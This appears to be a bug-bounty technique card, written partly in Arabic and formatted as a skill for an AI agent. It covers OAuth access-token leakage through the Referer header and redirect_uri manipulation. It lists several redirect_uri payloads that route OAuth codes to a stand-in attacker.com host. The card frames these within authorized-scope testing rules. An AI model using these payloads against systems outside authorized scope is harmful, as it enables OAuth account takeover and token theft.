# SKILL: OAuth Token Leakage عبر Referer Header + redirect\_uri

**Skill id:** `tip/oauth-token-leakage-عبر-referer-header-redirect-uri`  
**Category:** Auth Bypass, API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/a1aad45890a84a4786ccf2a82e2d3e65  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Auth Bypass, API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

في OAuth لو الـ access\_token أو code بيرجع في الـ URL (fragment/query) والصفحة بتحمّل موارد خارجية (صور/سكربت/analytics)، الـ Referer header بيودّي الـ URL كامل بالتوكن للطرف التالت. ولو الـ redirect\_uri validation ضعيفة تقدر توجّه الـ code لسيرفرك = OAuth ATO. ركّز على validation الـ redirect\_uri ومكان رجوع التوكن.

## Payload / Code

```
// 1) جرّب تلاعب redirect\_uri:
redirect\_uri=[https://attacker.com](https://attacker.com)
redirect\_uri=[https://target.com.attacker.com](https://target.com.attacker.com)
redirect\_uri=[https://target.com@attacker.com](https://target.com@attacker.com)
redirect\_uri=[https://target.com/callback/../../attacker](https://target.com/callback/../../attacker)
// 2) لو الـ token/code بيرجع في URL وفي موارد خارجية (img/script) → بيتسرّب في Referer
```

## Source

vux06 BB-Methodology / PortSwigger OAuth

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
